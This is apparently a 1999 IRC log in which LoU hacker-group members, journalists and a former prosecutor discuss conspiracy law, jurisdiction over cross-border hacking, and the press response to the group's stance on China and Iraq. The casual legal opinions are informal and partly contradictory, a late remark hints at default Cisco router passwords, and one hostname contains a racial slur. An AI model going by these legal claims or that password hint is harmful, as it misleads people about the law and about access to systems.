+      things cleared
+      [03:50] <optiklenz> before we continue speaking on human rights we'd like=
+      to
+      make certain that people understand who we are and where we are coming fr=
+      om
+      [03:50] <Winn> How can we help get your message across?
+      [03:50] <optiklenz> not precisely where we are coming from but you get th=
+      e
+      idea
+      [03:50] <optiklenz> =3D]
+      [03:50] <DigiEbola> A lot of people have asked us that same question.
+      [03:51] <m0f0> i'm from greek now at the moment
+      [03:51] <optiklenz> Some funding would be nice
+      [03:51] <optiklenz> =3D]
+      [03:51] <DigiEbola> including cbs and nbc from what i understand
+      [03:51] <optiklenz> but i dont see that
+      [03:51] <delam> heh
+      [03:51] <optiklenz> so lets move on shall we
+      [03:51] <optiklenz> heh
+      [03:51] <DigiEbola> what makes you people any different from the rest?
+      [03:51] <maquis> cbs/nbc there's media for ya....urg....TWPPT!
+      [03:51] * optiklenz urges mark to flutter his "heh's"
+      [03:51] * DigiEbola senses pimping.
+      [03:51] <m0f0> lol
+      [03:52] <maquis> theres a difference between the "media" and those of us =
+      in
+      the know like Winn, me, etc. that actually have some credibility in the
+      IT/IS/INFOSEC world...
+      [03:52] <feur> father, as an attorney i know you can only suggest ideas, =
+      non
+      directed, could you be of assistance
+      [03:52] <optiklenz> Winn> Maybe if you make a statement speaking on our
+      bedrock
+      [03:52] <optiklenz> made a statement even
+      [03:53] <maquis> people i have seen trust us more than the Big Media
+      Mongrels...
+      [03:53] <optiklenz> I've visited infowar a few times and I've seen archiv=
+      es
+      of media corrupt media to put it another way
+      [03:53] <Winn> I think that getting unedited, well structured positions o=
+      ut
+      to larger audiences is critical to any message.
+      [03:53] *** Quits: MsInfoWar (Ping timeout for
+      MsInfoWar[1Cust33.tnt4.st-petersburg.fl.da.uu.net]=0F)
+      [03:53] <optiklenz> It's spreaded infectiously
+      [03:53] <maquis> getting raw data, no spin, edits, etc....i agree that's =
+      the
+      way to go....
+      [03:54] <delam> one point of interest that I know of when you have a "gro=
+      up"
+      with a name is legally there are more things they can do to you.. MOD had
+      problems with that.. the people I was with we stayed away from having a
+      group name
+      [03:54] <maquis> but it can't appear to be from "kiddies" and look immatu=
+      re.
+      like Winn says, wellbalanced and well presented stuff.
+      [03:54] <Mark668> {sorry, I had to attend to other stuff for a minute:
+      hehehehehehe]
+      [03:54] <Father> First, I am not acting as an attorney here (as Winn know=
+      s).
+      [03:54] *** Joins: MsInfoWar (Beachie@*!*.uu.net)
+      [03:54] <DigiEbola> hmm
+      [03:54] <optiklenz> we have no legal name
+      [03:54] <optiklenz> heh
+      [03:54] <lothos> hahah
+      [03:55] <optiklenz> Lets see
+      [03:55] <DigiEbola> I am concerned tho, no body does anything for free
+      [03:55] <optiklenz> one sec
+      [03:55] <optiklenz> Lets take the police department
+      [03:55] <Father> Second, I need to know what (1) what the problem *is*, a=
+      nd
+      (2) what th desired result is.
+      [03:55] <optiklenz> If you have one bad cop and this guy goes out and
+      murders someone
+      [03:55] <optiklenz> is the whole police deparment at fault?
+      [03:55] <optiklenz> do they all get the death sentance?
+      [03:55] <optiklenz> are they all punished ?
+      [03:55] <optiklenz> absolutely not
+      [03:55] <delam> no but there is "racketeering" and conspiracy etc
+      [03:55] <optiklenz> Because then we'd have no cops
+      [03:55] <Father> Sometimes.  Not legally, but in fact.
+      [03:55] <optiklenz> if that were the case
+      [03:55] * datapleX feels that isn't a good example...
+      [03:56] <optiklenz> everyone department has a good and a bad
+      [03:56] <optiklenz> to stick us in the middle isn't any different
+      [03:56] <delam> I know what you're saying, but being a group there are la=
+      ws
+      that apply to groups of people that can be more harsh
+      [03:56] <delam> maybe father can help me out on this
+      [03:56] <DigiEbola> I am just trying to understand everyones motives, why
+      give a care about LoU?
+      [03:57] <Father> P.S. I think Winn invited me because I am a former Fed.
+      Pros.  Be warned.
+      [03:57] <optiklenz> ok
+      [03:57] <optiklenz> now is a good time to pee my pants i guess
+      [03:57] <feur> digi, we spoke the other night, i believe my generation ha=
+      s
+      an obligation to assist, but not be suckers
+      [03:57] <DigiEbola> Winn is associated with gov, that scares me in itself
+      [03:57] * datapleX cares not about feds because he never did NEthing wron=
+      g
+      [03:57] *** Joins: ice (~ice@i.like.to.eat.negrofish.net)
+      [03:58] <Father> Delam.  If a group acts as a group to break the law,
+      various serious penalties come into play that
+      [03:58] <DigiEbola> feur: true, but everyone always has a motive
+      [03:58] <optiklenz> Father> yes but we are not a mafia
+      [03:58] <Father> would not apply to an individual based upon his own
+      separate acts.
+      [03:58] <optiklenz> we are not into "organized crime"
+      [03:58] <feur> i think this groups agenda is somewhat up front
+      [03:58] <Winn> I am associated with hackers and that scares the hell out =
+      of
+      the feds!
+      [03:58] <optiklenz> every member has their own program
+      [03:58] <delam> optik: MOD wasn't mafia either but they had some major
+      problmes
+      [03:58] <dyslexia> Winn, heh
+      [03:58] <Father> Te questions is:  did the group have a common purpose to=
+      do
+      something the law says is illegal.
+      [03:59] <optiklenz> We are all adults no one can police what another pers=
+      on
+      does
+      [03:59] <maquis> i'm associated with Winn, that scares the hell out of ME=
+      !!!
+      heheheehe
+      [03:59] <Winn> HA!
+      [03:59] <dyslexia> lol
+      [03:59] <optiklenz> Father> nope
+      [03:59] <optiklenz> never had never will
+      [03:59] <optiklenz> We are a research group
+      [03:59] <Winn> Is this the "Yelling Fire
+      [03:59] <Winn> arguement?
+      [03:59] <datapleX> I thought is was wolf...?
+      [04:00] <datapleX> erm...n/m
+      [04:00] <optiklenz> We've worked with lots of major corporations, and we =
+      are
+      not about to blow our rep
+      [04:00] <optiklenz> its Crying Wolf
+      [04:00] <optiklenz> i beleive
+      [04:00] <optiklenz> Yelling fire is what old people do when they cant get
+      out of bed in time
+      [04:00] <delam> worked with corporations?  what kinda work is it,
+      penetration testing?
+      [04:00] <Father> The conclusion that a group had the requisite common
+      purpose is drawn by agents, prosecutors, judges, and jurors.  Even Bill
+      Clinton says he didn't lie, because is ain't is.
+      [04:01] <optiklenz> delam> programing, hosting, design, security
+      consultation
+      [04:01] <DigiEbola> our common purpose is research
+      [04:01] <optiklenz> you name
+      [04:01] *** Joins: sreality (sreality@*!*.org)
+      [04:01] <optiklenz> it
+      [04:01] <delam> k
+      [04:01] <Winn> I meant did you offer subtle encouragement for others to t=
+      ake
+      an action and is that really wrong?
+      [04:01] <optiklenz> no
+      [04:01] <optiklenz> No one took any action
+      [04:01] <optiklenz> thats the point we are trying to make
+      [04:02] <optiklenz> none  of the members did a cotten pickin thing
+      [04:02] <Father> Winn - the answer to the second part of your question,
+      legally speaking, is yes.
+      [04:02] <Winn> DId others, tho? THe Poles? Ideas are free and legal.
+      [04:02] <optiklenz> The Poles did
+      [04:02] <Winn> Are you saying Dad, that there might be legal culpability =
+      fo
+      their ideas?
+      [04:02] *** Quits: pent (=F9=ED=F9 Total uptime :    0d  0h 42m 42s=0F)
+      [04:02] <DigiEbola> can one be prosecuted for having a idea?
+      [04:02] <optiklenz> We claim no affiliations
+      [04:02] <optiklenz> whatever the polish people do in poland is on them
+      [04:03] <Father> I don't answer to "Dad."
+      [04:03] <lothos> no digi
+      [04:03] <lothos> this isn't 1984 I don't think.
+      [04:03] <Father> Sore point, Winn.
+      [04:03] <optiklenz> what we are saying here to night is we spoke our mind=
+      we
+      let people know what we were thinking and if that is a crime then I shoul=
+      d
+      be sentanced to death
+      [04:03] <optiklenz> because that is something I do
+      [04:03] <optiklenz> time and time again!
+      [04:03] <DigiEbola> lothos: ya never know....
+      [04:03] <Winn> Sorry, Father... :( I slap myself silly...
+      [04:03] <m0f0> i would be way under ground then
+      [04:04] <Father> Nor "Pop"
+      [04:04] <Father> "Hey you" might work.
+      [04:04] <delam> padre? :)
+      [04:04] <Father> Hmmm.  Not bad.
+      [04:05] <Father> Thoughts ain't a crime.
+      [04:05] <optiklenz> yeah
+      [04:05] <Winn> Legally, that is. :-)
+      [04:05] <optiklenz> if it was my next door neighbor could very well sue m=
+      e
+      for harassment
+      [04:05] <optiklenz> =3D]
+      [04:05] <lothos> hahah
+      [04:06] <Father> Two people agreeing (real low threshold) about something=
+      ,
+      and one of them doing a little something about it qualifies as a conspira=
+      cy:
+      5 years, $250K.
+      [04:06] <optiklenz> god knows what I've been thinking
+      [04:06] <optiklenz> heh
+      [04:06] <optiklenz> 250k?
+      [04:06] <Winn> Is that RICO?
+      [04:06] <delam> yeah, that's one I remember
+      [04:06] <optiklenz> hrmm I can grab some k's out of the ole alphabet soup
+      [04:06] <dyslexia> Father, at this point, regardless of what lou has said=
+      ,
+      without the help of a rather emphatic media, this whole issue would have
+      gone nowhere, the whole thing has been hyped and kept alive by the media,
+      suerly this cannot be construed as a crime on our part
+      [04:06] <Father> No, general conspiracy statute.
+      [04:06] <optiklenz> but i dont know about doing crime for something I did=
+      nt
+      know was going on
+      [04:07] <optiklenz> crime=3Dtime
+      [04:07] <optiklenz> Im fallin asleep here
+      [04:07] <DigiEbola> hm
+      [04:07] <maquis> the way this administration is going, there may  just be=
+      a
+      conspiracy statute..... :)
+      [04:08] <optiklenz> conspiracy of what?
+      [04:08] <m0f0> this is more getting to a discussion
+      [04:08] <Father> Whether you knew something was going on or not is a fact
+      question.  As is whether you wanted to encourage something to go on, even=
+      if
+      you didn't know it actually did.  Both of those can be conspiracy
+      liabilities.
+      [04:08] <delam> so is the real issue the ability to identify an individua=
+      l
+      on the internet who's making claims or speaking for others?  How much pro=
+      of
+      is there of this and have you guys tried to learn the real name etc of th=
+      e
+      guy who did say this stuff.
+      [04:08] <optiklenz> conspiracy of saying that we dont agree on certain
+      issues?
+      [04:08] <datapleX> I thought conspiracy was only against your own country=
+      ?
+      [04:08] <maquis> anything...hell, not to start a new can of worms, but lo=
+      ok
+      at the crypto debate and privacy rights. 'nuff said...and DON'T start a
+      crypto-chat debate!  :)
+      [04:08] <Father> Wrong.  Two prongs in general conspiracy stattue.
+      [04:09] <optiklenz> delam> theres a polish group, and a few other groups
+      from out of the u.s
+      [04:09] <optiklenz> they are the ones that are attacking these sites
+      [04:09] <optiklenz> not us
+      [04:09] <optiklenz> we wanted to speak out and make things known and noth=
+      ing
+      more
+      [04:09] <optiklenz> and that is all we did
+      [04:09] <Father> First prong: conspiracy to deprive the US gov. of some
+      right to function.
+      [04:09] <lothos> dataplex: that's treason man
+     [04:09] <optiklenz> something we didnt do
+      [04:09] <Father> Second: conspiracy to violate a law on the books, no mat=
+      ter
+      who the victim is.
+      [04:10] <m0f0> can't we just buy a law book or something?
+      [04:10] <optiklenz> another thing we have yet to do
+      [04:10] <delam> father: did the hacker that did make claims in the name o=
+      f
+      this group commit any crimes taht you know of?
+      [04:10] <Winn> Is hacking China illegal? OR Iraq?
+      [04:10] <optiklenz> Why ask us?
+      [04:10] <DigiEbola> well, lets take a step away from us liabilities a mom=
+      ent
+      and focus on .cn actions, you ppl seem to have some insight that they are
+      wanting to get rid of us
+      [04:10] <optiklenz> We did none of that
+      [04:10] <lothos> i agree digi
+      [04:10] <Father> Conspiracy to get unauthorized access to computer is cri=
+      me,
+      no matter who victim is, even Iraq or Iran or Ireland.
+      [04:11] <DigiEbola> i am more worried about .cn then .us
+      [04:11] <lothos> father, even .jp?  Hacking isn't illegal in japan i
+      thought...
+      [04:11] <m0f0> then they will thing of something to put you in jail for
+      [04:11] <datapleX> loth: depends on where the hack originates from
+      [04:12] <Father> As long as Japanese computer is hooked up to a computer =
+      in
+      US, hacking into the Japanese computer is US crime.
+      [04:12] <Winn> I suggest that .cn doesnt 'get' it completely. They try to
+      ban sat dishes and now the death penalty for $34K in hacking a bank. Mayb=
+      e a
+      call for detente is called for here.
+      [04:12] <delam> perhaps transport of illegally acquired information from =
+      any
+      other country would be considered illegal by us law?
+      [04:12] <lothos> what if i hack a .jp computer from another .jp computer?
+      would that be illegal? (sorry to stray off topic here..)
+      [04:12] <maquis> delam, HTF are you gonna enforce that one? that's amost =
+      as
+      funny as something AG Reno would say!!!
+      [04:13] <Father> I'll punt on your last question, delam: too fact specifi=
+      c.
+      [04:13] <optiklenz> groups run by little kids with names like HcV, Tougon=
+      g
+      (individual), NIS, Polish Hackers against China, spl0it are the ones doin=
+      g
+      all the illegitimate protest
+      [04:14] <Father> Lothos, depends on whether hacked computer is connected
+      (indirectly) to computer in US.  Hey, what omputer worth hacking ain't on
+      the Inernet?
+      [04:14] *** Quits: Mark668 (Read error to
+      Mark668[adsl-209-78-192-20.dsl.pacbell.net]: EOF from client=0F)
+      [04:14] <optiklenz> heh
+      [04:14] <lothos> so if i'm physically on u.s. soil then it'd be a crime?
+      [04:14] *** Joins : Mark668 (irc@*!*.pacbell.net)
+      [04:14] <Father> P.S. I may sign off for a while.  If I do, I'll be back.
+      [04:15] <optiklenz> lothos> no
+      [04:15] <optiklenz> If you log into a system that is based in japan
+      [04:15] <optiklenz> and from that system access another its not illegal
+      [04:15] <Father> Yep.  Question is whether anyone would prosecute. If Jap=
+      an,
+      Inc. asked, someone might.
+      [04:15] <optiklenz> or maybe it is
+      [04:15] <optiklenz> heh
+      [04:16] <m0f0> "heh"
+      [04:16] <Winn> According to FBI, they can git ya for hacking intl based u=
+      pon
+      some interpretation of #1030/1029
+      [04:16] <optiklenz> ah
+      [04:16] <optiklenz> ok
+      [04:16] <feur> IMHO, a more subtle question at this point is what if acti=
+      ons
+      will .cn and Iraq take legally or illegally
+      [04:16] <optiklenz> what can they do?
+      [04:16] <optiklenz> we've done nothing to any systems in .cn or iraq
+      [04:16] <optiklenz> plus iraq is not even setup to a global network
+      [04:17] <optiklenz> and most of their internal networks are probably blow=
+      n
+      to shreads by now
+      [04:17] <Father> Remember, at the base level, jurisdiction is merely powe=
+      r;
+      like code is merely bits.
+      [04:17] <feur> the purported threat to those countries systems
+      [04:17] <maquis> iraq doesn't have much in the way of connectivity outsid=
+      e
+      the nation....
+      [04:17] <optiklenz> not even via tymnet
+      [04:17] <Winn> Sometimes the best way to disguise is to emphasize. I stil=
+      l
+      think you need to get LOUD AND CLEAR about what you're really about.
+      [04:17] <optiklenz> and the only x.25 they've heard of is pocket change
+      [04:18] <feur> optik, x.25 and sna, is generally out of the  reach and gr=
+      asp
+      of today's hax0rs
+      [04:18] <delam> fact #1: it's hard as hell to prove any crime on the
+      internet, and I'm sure you all know that, therefore #2, you're not worrie=
+      d
+      about any LEGAL actions by china or the US but you're more worried about =
+      non
+      legal actions
+      [04:18] <DigiEbola> exactly
+      [04:19] <DigiEbola> it may be not only to off us, but to test the us gov
+      [04:19] <DigiEbola> if one of us got killed, what would the us do?
+      [04:19] <optiklenz> as i stated what if some chinese loyalist gets the wr=
+      ong
+      idea and decides to use our heads as hunting trophies
+      [04:19] <optiklenz> theres not much they could do
+      [04:19] <lothos> I personally am worried about what .cn would do to us,
+      legally or not.
+      [04:20] <feur> optik, it would not be a chinese loyalist, it would organi=
+      zed
+      chinese gangs
+      [04:20] <optiklenz> yeah
+      [04:20] <optiklenz> thats something to worry about
+      [04:20] <Mark668> Excuse me, I have to disappear for a while ... I'll be
+      back ... I got a message from Betty that I was expected to "say" somethin=
+      g
+      ... if someone would let me know what I'm supposed to say, please private
+      chat me.
+      [04:20] <optiklenz> Mark> who are you again?
+      [04:21] <maquis> most of the .cn gangs alrady operate her in the states...
+      [04:21] <delam> There is a reverse philosophy but it sounds insane, it's =
+      a
+      people-buffer-overflow.. if more people started hacking china, the number=
+      of
+      targets that china would go after would increase beyond what they could h=
+      ave
+      the man power to handle
+      [04:21] <optiklenz> yeah thats the thing
+      [04:21] <DigiEbola> they have a lot of people
+      [04:21] <optiklenz> people totally blew what we said out of proportion
+      [04:22] <Father> Any one gonna be at CFP99?
+      [04:22] <delam> I wish
+      [04:22] <optiklenz> Father> nope
+      [04:22] <maquis> maybe if i can get away from work...always a problem the=
+      se
+      days....
+      [04:22] <lothos> anyone gonna be at RootFest? :)
+      [04:22] <optiklenz> I'll be lecturing at rootfest though
+      [04:22] <Winn> Via vidtel
+      [04:22] <delam> rootfest in MPLS?
+      [04:22] <lothos> so is winn via video conf
+      [04:22] <optiklenz> yes
+      [04:22] <Mark668> I'm an freelance writer and consultant (see
+      http://www.gibbs.com/mgbio.htm for a ... well, bio) I write for Network
+      World (the weekly Backspin column and, starting on the 25th, a weekly
+      feature called "Gearhead".
+      [04:23] <lothos> that reminds me, winn.. we need to tlak about that still
+      [04:23] <lothos> talk
+      [04:23] <Winn> tomorrow!
+      [04:23] <Father> Signing off.  Be back. - Father, aka Padre ;-)
+      [04:23] <delam> heh :)
+      [04:23] <lothos> sure
+      [04:23] <optiklenz> mark> ok
+      [04:23] <DigiEbola> hm
+      [04:23] <lothos> I'll give you a call
+      [04:23] <feur> what can winn and local friends and...., do and gain
+      permission from LOU, to assert some risk management in this somewhat jade=
+      d
+      affair
+      [04:23] <Winn> thanks... > noon
+      [04:24] *** Quits: Father (Leaving=0F)
+      [04:24] <optiklenz> What can you do?
+      [04:24] <lothos> I have a class at noon... would 1pm work CST?
+      [04:24] <Winn> yep!
+      [04:24] <lothos> cool, 1pm CST then.
+      [04:24] <maquis> make it so, Mister Winn..... :)
+      [04:25] <DigiEbola> options options options
+      [04:25] <feur> 1. establish a unified position
+      [04:25] <feur> 2. control disseminations to the media
+      [04:26] <delam> passively time is the best option, actively that's
+      difficult.. the media is the best option I can think of actively
+      [04:26] <feur> 3. establish some DC international attorney to act as buff=
+      er
+      [04:26] <Winn> You need to have a SINGLE mouthpiece if you really want to
+      control the message. Or have a bunch of folks sign the same one.
+      [04:27] <optiklenz> I think getting an attorney would only make people th=
+      ink
+      we have reason to be afraid like we did something criminal that justifies
+      having one
+      [04:27] *** Quits: MsInfoWar (Ping timeout for
+      MsInfoWar[1Cust33.tnt4.st-petersburg.fl.da.uu.net]=0F)
+      [04:27] <feur> optik, the right attorney only acts as a buffer, not an
+      admission ogf guilt
+      [04:27] <optiklenz> Well if i can find an attorney i can afford i'll look
+      into it
+      [04:28] <Winn> Try the EFF maybe or EPIC or the CDC
+      [04:28] <DigiEbola> .cn would care less if we have a attorney
+      [04:28] <DigiEbola> heh
+      [04:28] <delam> If you all did a press conference and were serious about =
+      it,
+      a lawyer would be great to help decide what needs to be said.
+      [04:28] <feur> i took the liberty of contacting an old acquaintance from =
+      the
+      DOJ, who is in private practice in Boston, well known, and would pro bono
+      look into the whole
+      [04:29] <optiklenz> ok well this is a conference with out the "press"
+      [04:29] <optiklenz> frankly Im tired of having people get things wrong
+      [04:29] <optiklenz> not only has it hurt me, but it's done a great deal t=
+      o a
+      lot of other people
+      [04:30] <DigiEbola> ppl will see what they want to see
+      [04:30] <feur> but optik, tonight we hear from you, what do the other
+      members of LOU want to do
+      [04:30] <optiklenz> We are here as representatives of the group
+      [04:30] <optiklenz> We've takin what they think, and what they want into
+      consideration, and we are giving it to you
+      [04:30] <optiklenz> as a whole
+      [04:31] <DigiEbola> part of the reason, the press blew this up, is becaus=
+      e
+      THEY wanted to see someone break stuff in those countries
+      [04:31] <optiklenz> can we take a 5minute bathroom break?
+      [04:31] <feur> i think the next step would be to set up a VMB to chat
+      [04:31] <delam> alliance teleconference? :)
+      [04:31] <delam> ..memories
+      [04:31] <Winn> Free from GTE?
+      [04:32] <optiklenz> great, be back then.
+      [04:32] <delam> winn: now now! shh
+      [04:32] <Winn> heh
+      [04:32] <feur> gte, good stock, lol
+      [04:32] <maquis> naughty boy
+      [04:32] <DigiEbola> brb
+      [04:32] <kInGb0nG> brb
+      [04:32] <Winn> brb?
+      [04:32] <maquis> be right back..
+      [04:32] <kInGb0nG> be right back
+      [04:32] <maquis> <d'oh!
+      [04:32] <Winn> slap me! :)
+      [04:32] <maquis> < -- SMACKS WINN
+      [04:32] <maquis> hehehehe
+      [04:33] <Winn> damn that stings
+      [04:33] <maquis> btw, winn,nice article on strikeback this week....nice
+      resaerch...
+      [04:33] <Winn> you should see the hate mail! INcluding the Pentagon!!!
+      [04:33] * delam agrees
+      [04:33] <DigiEbola> back
+      [04:33] *** Joins: hjghjkghk (~jailednot@*!*.co.nz)
+      [04:33] *** Quits: dyslexia (Ping timeout for
+      dyslexia[p34-max2.dun.ihug.co.nz]=0F)
+      [04:33] <maquis> winn - wonder why heheheehehe
+      [04:33] *** hjghjkghk is now known as dyslexia
+      [04:33] <maquis> does Rome Labs ring a bell?  :)
+      [04:33] <optiklenz> ok im back
+      [04:33] <Winn> heh
+      [04:34] <dyslexia> air force base isn't it?
+      [04:34] <Winn> yup
+      [04:35] <feur> optik, what can winn and company disseminate of tonight's
+      chat, you set the rules
+      [04:35] *** Quits: kInGb0nG (Ping timeout for
+      kInGb0nG[dayoh-a242.gemair.com]=0F)
+      [04:36] *** Joins: kInGb0nG (~lil_b0ng@*!*.com)
+      [04:36] <optiklenz> ok
+      [04:36] *** cd is now known as Nikkita
+      [04:36] <optiklenz> just what we've been talking about
+      [04:36] <lothos> as far as I care, you can disseminate any/all of it
+      [04:36] <Winn> OK: I view this as a PR problem with some potential bad
+      downside. Whatever you decide, it really needs to be coherent and absolut=
+      ely
+      unambiguous.
+      [04:36] <optiklenz> people need to know that we are not the bad guys
+      [04:36] <optiklenz> Winn> we can edit some things out
+      [04:36] <feur> optik, can you provide one summary statement on behalf of =
+      the
+      LOU
+      [04:37] <optiklenz> this can be a joint statement from Inforwar, Infosec,
+      and LOU
+      [04:37] <optiklenz> if thats the way you want it
+      [04:37] <Winn> If we take that route, I will edit it, then pass it to yo =
+      for
+      approval.
+      [04:37] <feur> no, what do you want
+      [04:37] <optiklenz> s/inforwar/infowar
+      [04:37] <dyslexia> whatever will require being signed by all memebers etc
+      [04:37] <lothos> sounds good winn
+      [04:38] <maquis> < - signs in spirit
+      [04:38] <optiklenz> =3D]
+      [04:38] <DigiEbola> heh
+      [04:38] <optiklenz> thanks marquis
+      [04:38] <Nikkita> Optik: thnx to so cold 'hackers' talking negatifly in t=
+      he
+      MEDIA about LOU, youre scratched, but If you didn't though an IP of that
+      countries there is nothing to be afraid of
+      [04:38] <optiklenz> we did nothing
+      [04:38] <optiklenz> marquis, and nikkita
+      [04:38] <optiklenz> heh
+      [04:38] <optiklenz> sounds like a match made in heaven
+      [04:39] <Winn> I suggest I send to OPT, let him and I work out the edits
+      then he adds the names he wants to add, and we all distribute tonights
+      conversation PLUS a 1 pafge statement.
+      [04:39] <Nikkita> optik: so there is nothing to afraid of.
+      [04:39] <maquis> mmmm....nikita.....  LOL
+      [04:39] <optiklenz> winn> that works for me
+      [04:39] <Nikkita> maquis: I kill also :P
+      [04:39] <optiklenz> everyone else fine with that?
+      [04:39] <Winn> Send me your contact stuff, and I will get to it AM. You h=
+      ave
+      my voice #. ?
+      [04:39] <maquis> You don't know me, then.  :-)
+      [04:40] <DigiEbola> hm
+      [04:40] <optiklenz> Winn> no
+      [04:40] <maquis> heheeheh
+      [04:40] <Nikkita> optik: Other issue
+      [04:40] <DigiEbola> we should do a teleconference
+      [04:40] <Winn> It would be useful to have some form of ID for the
+      participants, even if it is anonymous. Can you do OPT?
+      [04:40] <optiklenz> can i do what?
+      [04:40] <Nikkita> optik: I red what father said about criminal organisati=
+      ons
+      [04:40] <optiklenz> heh
+      [04:41] <optiklenz> Winn> if you mean card everyone
+      [04:41] <optiklenz> im sure i can work something out
+      [04:41] <Winn> heh... no, I don't want to get things wrong, tho.
+      [04:41] * optiklenz use to be really cool with a few of the local bouncer=
+      s
+      [04:41] <optiklenz> =3D]
+      [04:41] <delam> hahah
+      [04:41] <feur> winn, needs some of identification and authentication, or =
+      he
+      is dead as a journalist
+      [04:41] <Nikkita> optik: but If someone hacks something where goverment h=
+      as
+      a investigestion of spionage activity going on, then they will find
+      you/already found you.
+      [04:42] <optiklenz> Winn> mail me at optik@legions.org
+      [04:42] <optiklenz> and i'll respond
+      [04:42] <optiklenz> if you want you can have my pgp key
+      [04:42] <feur> nikkita, i can assure all associated members of LOU are
+      known, down to their dental records
+      [04:42] <lothos> my email is lothos@trifid.net, pgp key is available from
+      www.rootfest.org
+      [04:42] <maquis> feur - now THAT'S class!
+      [04:42] <Winn> OPT" if we can talk voice, I can tape a statement as well.
+      You can call me if you want. Use PGP, mine is on the PGP server.
+      [04:42] <lothos> down to our dental records???
+      [04:42] <feur> assure that associated intelligence agencies
+      [04:43] <Nikkita> feur: In that case they did something wrong :)
+      [04:43] <DigiEbola> digi@wintermute.unixgeeks.com
+      [04:43] <optiklenz> Winn> heh
+      [04:43] <feur> if you have no teeth, lol
+      [04:43] <Nikkita> Feur: I can assure you that nobody knows about M0f0
+      [04:43] <Nikkita> feur: That's a advice :)
+      [04:43] <optiklenz> i'm not to excited with the idea of having a voice
+      statement passed around and archived
+      [04:44] <DigiEbola> hm
+      [04:44] <DigiEbola> im still hazy about a bunch of fat guys goin thru my
+      records
+      [04:44] <optiklenz> haha
+      [04:44] <feur> nikkita, you misunderstood my statement
+      [04:44] <Winn> Fine. You make the call. No prob!
+     [04:44] <optiklenz> Winn> trust me on this one bro
+      [04:44] <Nikkita> optik: I there tapping you, there's no way to check tha=
+      t.
+      [04:44] <optiklenz> nikk> actually there is
+      [04:45] <optiklenz> and if they've got a dnr on my line i can very well f=
+      ind
+      out too
+      [04:45] <Nikkita> feur: Well I will let my teeths removed tomorrow or so =
+      :)
+      [04:45] <feur> lol
+      [04:45] <delam> heh
+      [04:45] <maquis> I know a good dentist that doesn't ask any questions...r=
+      oad
+      trip to London!  :)
+      [04:45] <maquis> heheehehe
+      [04:45] <Winn> So, tomorrow, we exchange some email... build your story...
+      and we agree not to release until we are all in agreement with it, and yo=
+      u
+      have it 'signed' by your folks.
+      [04:45] <Nikkita> Optik: just trust me on that.
+      [04:46] <optiklenz> Winn> thats the deal
+      [04:46] <Winn> Perfect. Agreed.
+      [04:46] <Nikkita> Maquis: London is just 30 minutes from Amsterdam, pleas=
+      e
+      mail me the adres :)
+      [04:47] <Nikkita> Maquis: Is he expensive :)
+      [04:47] <maquis> HAR! Nikkita, super spy of the 90s should be able to fin=
+      d
+      it.....!
+      [04:48] <Nikkita> maquis: www.dental.record.org ---> www.illegal.dentist.=
+      com
+      [04:48] <delam> heh
+      [04:48] <optiklenz> well folks
+      [04:48] <maquis> yep, that's him... :)
+      [04:48] <Nikkita> maquis: ever seen a blond without theet
+      [04:48] <optiklenz> if thats all i'll be out for the night
+      [04:48] <maquis> < -- heading out in a bit himself.
+      [04:49] <delam> yeah winn you sleeping?
+      [04:49] <DigiEbola> I must concur with my associate
+      [04:49] <optiklenz> we'll keep in touch
+      [04:49] <optiklenz> =3D]
+      [04:49] <maquis> seeya opti
+      [04:49] * Nikkita is going to sleep for 4 ours, because he has a milleniu=
+      m
+      update around 5 ours....
+      [04:49] <DigiEbola> later all
+      [04:49] <maquis> later later and even later!
+      [04:50] <kInGb0nG> later
+      [04:50] <datapleX> so maquis...gonna hook me up wif an internic account? =
+      ;)
+      [04:50] <feur> thank you all for coming on and trusting a bit
+      [04:50] *** Quits: kInGb0nG (the king has left the building=0F)
+      [04:50] *** Quits: DigiEbola (Leaving=0F)
+      [04:50] <maquis> feur: no prob...
+      [04:50] *** Quits: datapleX (later...=0F)
+      [04:50] <Winn> Gentlemen! Thanks ... OPT - not to worry. Tomorrow!
+      [04:50] <delam> nice meeting you guys
+      [04:50] <Nikkita> maquis: and a hit2000.org :)
+      [04:50] <maquis> Later all -- thanks for the invite
+      [04:50] <optiklenz> sure thing
+      [04:50] <maquis> hey, we DO the domain names.... :)
+      [04:50] <delam> check out my cute portrait on the spring issue 1996 of 26=
+      00
+      if you like :)
+      [04:50] *** Quits: optiklenz (eprom=0F)
+      [04:50] *** Parts: Winn (Winn@1*!*.uu.net)
+      [04:51] <Nikkita> maquis: I will mail jou a zone file then :) or give me =
+      the
+      IP of root nameserver :)
+      [04:51] <maquis> heehe...NOT!
+      [04:51] <Nikkita> maquis: ptr would do :)
+      [04:52] <maquis> ptr? as in comPuTeR?
+      [04:52] <Nikkita> ptr record :)
+      [04:52] <delam> char *ptr; ?
+      [04:52] <Nikkita> uh... know linux?
+      [04:52] *** Joins: Father (Agrosso@170.*!*.att.net)
+      [04:52] <maquis> Ahhh...leee-nux....
+      [04:52] * Nikkita tells everyone about DNS howto :)
+      [04:53] <maquis> << - NT (ack!) person
+      [04:53] <feur> ptr as in polish hax0r crew
+      [04:53] <Father> Have I missed anything
+      [04:53] <delam> like jurassic park "Eye Know Yooooooo neeekz"
+      [04:53] <Father> Where is Winn?
+      [04:53] <delam> he left
+      [04:53] <feur> winn, going to sleep
+      [04:54] <Nikkita> Farther: In the Netherlands is privacy exposed trough a
+      software bug not punished,
+      [04:54] <delam> wrapping it up right now father
+      [04:54] <maquis> I'm heading off, all. Thanks for the invites, keep yer
+      heads down, chins up, and....
+      [04:54] <maquis> ...lets be careful out there.
+      [04:54] <Nikkita> If I use an in America located router to connect to a
+      server in The Netherlands, and USE a bug
+      [04:54] <maquis> Night all...rick....
+      [04:54] <Nikkita> could I be convicted in America?
+      [04:54] *** Quits: maquis (Leaving=0F)
+      [04:55] <delam> it's indirect, data still was used from america to perfor=
+      m
+      the action... he mentioned indirect before
+      [04:55] <Father> I'm not clear on the question
+      [04:55] <Nikkita> delam: I'm stationed in the Netherlands.
+      [04:56] <delam> so american property was involved in a crime?
+      [04:56] <Nikkita> Could I be convicted cause I used in USA stationed
+      equipment.
+      [04:56] <Nikkita> delam: nope, just the connection
+      [04:56] <Father> What does "in USA stationed equipment"?
+      [04:56] <Nikkita> it has IP traffic, which I use
+      [04:57] <Nikkita> delam: typing cisco as a password in a Cisco router isn=
+      't
+      hacking...
+      [04:57] <delam> heh, there's alot of definintions to hacking, I agree
+      [04:58] *** Quits: lothos (g'night=0F)
+      [04:58] <dyslexia> heh, it might not be hacking, but it is truly sad how
+      often it works
+      [04:59] <Nikkita> Father: a router is located fysical in USA, I connect t=
+      o
